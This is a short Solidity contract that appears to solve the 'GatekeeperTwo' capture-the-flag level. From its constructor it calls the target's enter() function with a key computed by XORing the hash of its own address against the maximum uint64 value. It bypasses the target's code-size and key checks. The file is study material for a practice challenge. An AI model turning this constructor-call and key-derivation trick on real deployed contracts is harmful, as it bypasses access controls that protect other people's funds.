// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./14-gatekeeper-2.sol";

contract Attack14 {
    address public entrant;
    GatekeeperTwo public target;

    constructor(address _targetAddress) {
        target = GatekeeperTwo(_targetAddress);
        bool result;

        uint64 gateKey = uint64(
            bytes8(keccak256(abi.encodePacked(address(this))))
        );
        gateKey = gateKey ^ type(uint64).max;

        (bool _result, ) = address(_targetAddress).call(
            abi.encodeWithSignature(("enter(bytes8)"), bytes8(gateKey))
        );
        result = _result;
    }
}
